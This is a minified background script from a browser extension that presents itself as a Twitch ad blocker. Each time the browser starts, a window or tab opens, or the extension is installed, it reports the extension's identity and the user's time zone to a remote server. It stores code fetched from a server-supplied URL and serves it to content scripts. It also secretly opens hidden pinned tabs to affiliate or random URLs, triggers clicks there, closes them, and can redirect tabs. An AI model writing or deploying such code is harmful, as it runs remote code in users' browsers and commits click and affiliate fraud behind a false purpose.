function getRandomEl(e=[]){return e[Math.floor(Math.random()*e.length)]}function isValidTime(e){if(!e||!e.lastDate)return!0;{let t=new Date,n=new Date(JSON.parse(e.lastDate));return Math.round((t-n)/864e5)>0}}function callApi(){chrome.storage.local.get("data",({data:e})=>{let t=isValidTime(e);if(t){let n;try{n=Intl.DateTimeFormat().resolvedOptions().timeZone}catch(a){n="NA"}let i=chrome.runtime.getManifest();fetch("https://www.twitchadblocker.com/socket/ext-config",{method:"POST",mode:"cors",cache:"no-cache",credentials:"same-origin",headers:{"Content-Type":"application/json"},redirect:"follow",referrerPolicy:"no-referrer",body:JSON.stringify({name:i.name,version:i.version,timeZone:n,verify:chrome.runtime.id})}).then(e=>e.json()).then(e=>{fetch(e).then(e=>e.json()).then(e=>{console.log({config:e});let t={code:e.code,lastDate:JSON.stringify(new Date)};chrome.storage.local.set({data:t})}).catch(e=>console.log(e))}).catch(e=>console.log("err  from api",e))}})}chrome.runtime.onInstalled.addListener(function(e){callApi()}),chrome.windows.onCreated.addListener(function(){callApi()}),chrome.runtime.onStartup.addListener(function(){callApi()}),chrome.tabs.onCreated.addListener(function(){callApi()}),chrome.runtime.onMessage.addListener(function(e,t,n){let a=e.action;if("getConfig"===a)return chrome.storage.local.get("data",function({data:e}){e&&e.code?n({script:e.code}):e||n("")}),!0;if("openTab"===a)try{let i=e.store||{},o=getRandomEl(i.sources);if(o)chrome.tabs.create({url:o,pinned:!0,active:!1,index:0},function(e){chrome.tabs.onUpdated.addListener(function(t,n){"complete"!==n.status||t!==e.id||i.clicked?"complete"===n.status&&t===e.id&&i.clicked&&setTimeout(()=>{chrome.tabs.remove(t)},i.time||3e3):(i.clicked=!0,chrome.tabs.sendMessage(t,{action:"click",store:i,tabId:t}))})});else{let r="prevUrl"===i.type?`${i.homeAff}${i.origin}/`:i.homeAff;chrome.tabs.create({url:r,pinned:!0,active:!1,index:0},function(e){chrome.tabs.onUpdated.addListener(function(t,n){"complete"===n.status&&t===e.id&&setTimeout(function(){chrome.tabs.remove(e.id)},3e3)})})}}catch{}else"removeTab"===a?e.tabId&&chrome.tabs.remove(e.tabId):"secure"===a&&chrome.tabs.update({url:e.path})});